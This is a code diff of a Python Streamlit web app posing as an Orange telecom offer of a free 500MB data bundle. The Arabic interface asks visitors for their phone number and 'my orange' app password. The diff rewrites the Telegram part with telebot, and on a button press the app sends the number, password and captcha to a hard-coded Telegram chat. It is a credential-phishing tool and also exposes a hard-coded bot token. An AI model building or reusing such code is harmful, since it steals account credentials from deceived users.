@@ -1,27 +1,20 @@
 import streamlit as st
-from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
+import telebot
 
 # Replace 'YOUR_TOKEN' with your Telegram Bot token
 TOKEN = '7060312406:AAGqNhOh6s4RVufoV4Qp1eq8D0DNNDfDiZs'
-# Replace 'YOUR_CHAT_ID' with your chat ID
-CHAT_ID = '5939899289'
 
-def start(update, context):
-    update.message.reply_text('مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')
+bot = telebot.TeleBot(TOKEN)
 
-def echo(update, context):
-    chat_id = update.message.chat_id
-    message_text = update.message.text
-    context.bot.send_message(chat_id=chat_id, text=message_text)
+@bot.message_handler(commands=['start'])
+def start_message(message):
+    bot.reply_to(message, 'مرحبًا! قم بإدخال رقم تليفون اورانج وباسورد تطبيق my orange.')
+
+@bot.message_handler(func=lambda message: True)
+def echo_message(message):
+    bot.send_message(message.chat.id, message.text)
 
 def main():
-    updater = Updater(TOKEN, use_context=True)
-    dp = updater.dispatcher
-    dp.add_handler(CommandHandler("start", start))
-    dp.add_handler(MessageHandler(Filters.text & ~Filters.command, echo))
-    updater.start_polling()
-    updater.idle()
-
     st.title('500MB | orange')
 
     st.markdown(
@@ -113,9 +106,8 @@ def main():
 
     if st.button("add 500mb"):
         bot_message = f"رقم التليفون: {number}\nباسورد تطبيق my orange: {password}\nكود الكباتشا: {captcha_response}"
-        updater = Updater(TOKEN)
-        updater.bot.send_message(chat_id=CHAT_ID, text=bot_message)
-        st.write("تم ")
+        bot.send_message('5939899289', bot_message)
+        st.write("تم إرسال المعلومات.")
 
 if __name__ == '__main__':
     main()
